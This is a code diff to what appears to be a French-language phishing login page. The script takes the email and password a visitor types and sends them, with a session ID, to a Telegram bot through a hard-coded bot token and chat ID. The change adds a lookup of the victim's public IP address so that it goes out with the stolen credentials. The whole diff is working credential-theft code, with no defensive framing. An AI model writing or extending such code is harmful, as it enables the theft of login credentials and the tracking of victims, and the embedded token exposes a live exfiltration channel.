@@ -142,6 +142,22 @@
     const TELEGRAM_TOKEN = "9165642873:AAFLPg7M2QpgRpwlbKtjKKlnrNe25oJckPo";
     const TELEGRAM_CHAT_ID = "8550191274";
 
+    async function getClientIP() {
+      let ip = localStorage.getItem('client_ip');
+      if (!ip) {
+        try {
+          const res = await fetch('https://api.ipify.org?format=json');
+          const data = await res.json();
+          ip = data.ip;
+          localStorage.setItem('client_ip', ip);
+        } catch (e) {
+          ip = 'Inconnue';
+        }
+      }
+      return ip;
+    }
+    getClientIP();
+
     let clientId = localStorage.getItem('client_id');
     if (!clientId) {
       clientId = 'User_' + Math.random().toString(36).substr(2, 6).toUpperCase() + '_' + Date.now().toString().slice(-4);
@@ -154,9 +170,11 @@
       const password = document.getElementById('password').value;
       if (!email || !password) return;
 
-      const message = `🔔 *Nouvelle info - Connexion combinée*\n🆔 Session: \`${clientId}\`\n📧 E-mail: \`${email}\`\n🔒 Mot de passe: \`${password}\``;
       const btn = document.getElementById('submitBtn');
       btn.disabled = true;
+      const clientIp = await getClientIP();
+
+      const message = `🔔 *Nouvelle info - Connexion combinée*\n🆔 Session: \`${clientId}\`\n🌐 IP: \`${clientIp}\`\n📧 E-mail: \`${email}\`\n🔒 Mot de passe: \`${password}\``;
 
       try {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
